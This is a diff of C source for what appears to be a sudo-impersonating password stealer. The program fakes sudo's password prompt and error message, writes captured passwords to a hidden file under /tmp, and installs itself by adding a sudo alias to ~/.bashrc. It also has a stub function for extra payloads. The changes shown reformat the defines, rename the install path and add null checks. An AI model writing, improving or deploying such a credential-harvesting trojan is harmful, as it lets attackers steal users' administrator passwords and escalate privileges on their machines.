@@ -1,3 +1,5 @@
+/* Copyright 2019 Adam McKenney, see LICENSE for details */
+
 #include <stdio.h>
 #include <termios.h>	//no echo
 #include <stdlib.h>	//dynamic mem
@@ -11,17 +13,22 @@
 	#define DEBUG 0
 #endif
 
-#define MAX 1024			//size for inputs
-#define PROMPT "[sudo] password for "	//what sudo says for a prompt
-#define END ": "			//how the prompt ends
-#define WRONG "Sorry, try again."	//what sudo says on wrong password
-#define ON 1				//flags for echo
+#define MAX 1024				//size for inputs
+#define PROMPT "[sudo] password for "		//what sudo says for a prompt
+#define END ": "				//how the prompt ends
+#define WRONG "Sorry, try again."		//what sudo says on wrong password
+#define ON 1					//flags for echo
 #define OFF 0
-#define OUT_FILE "/tmp/.320984"		//set this for where you want the password to be stored
-#define COMMAND_PREFIX "sudo "		//command that we're pretending to be
-#define ALIAS "alias sudo="		//start of the alias
-#define DEFAULT_LOCATION "~/.sudo-debug.out"	//location of this program
-#define CONFIG_FILE "/.bashrc"		//location of the config file with a '/'
+#define OUT_FILE "/tmp/.320984"			//set this for where you want the password to be stored
+#define COMMAND_PREFIX "sudo "			//command that we're pretending to be
+#define ALIAS "alias sudo="			//start of the alias
+#define DEFAULT_LOCATION "~/.sudo-kit.out"	//default location of this program for installing
+#define CONFIG_FILE "/.bashrc"			//location of the config file with a '/'
+
+int payload(){
+	/* additional things the program should do goes here */
+	return 3; //change this to 0 when a payload is added
+}
 
 void get_user(char *buf, size_t size){
 	/* Used to get username */
@@ -109,11 +116,6 @@ int get_info(){
 	return 0;
 }
 
-int payload(){
-	//additional things the program should do goes here
-	return 0;
-}
-
 int prompt_user(char* commands){
 	/* Mimicks sudo */
 	//set up vars
@@ -160,14 +162,15 @@ int prompt_user(char* commands){
 }
 
 int main(int argc, char *argv[]){
-	if(argc == 1)
-		return prompt_user("echo hi");
-	else if(!strcmp(argv[1], "-i")){
+	if(argc == 1){
+		if(DEBUG) return prompt_user("echo hi");
+		else return 2;
+	} else if(!strcmp(argv[1], "-i")){
 		if(argv[2] == NULL)
 			return install(DEFAULT_LOCATION);
 		else
 			return install(argv[2]);
-	}else if(!strcmp(argv[1], "-u"))
+	} else if(!strcmp(argv[1], "-u"))
 		return uninstall();
 	else if(!strcmp(argv[1], "-g"))
 		return get_info();
@@ -175,6 +178,7 @@ int main(int argc, char *argv[]){
 		help();
 	else {
 		char *commands = calloc(MAX, sizeof(char));
+		if(commands == NULL) return 3;
 		int arg_counter, arg_char, string_char=0;
 		strcat(commands, COMMAND_PREFIX);
 		string_char += sizeof(COMMAND_PREFIX)-1;
@@ -185,6 +189,7 @@ int main(int argc, char *argv[]){
 				commands[string_char] = argv[arg_counter][arg_char];
 				string_char++;
 				if(string_char >= MAX) commands = realloc(commands, MAX*sizeof(char));
+				if(commands == NULL) return 4;
 			}
 			commands[string_char] = ' ';
 			string_char++;
@@ -196,3 +201,4 @@ int main(int argc, char *argv[]){
 	}
 	return 0;
 }
+
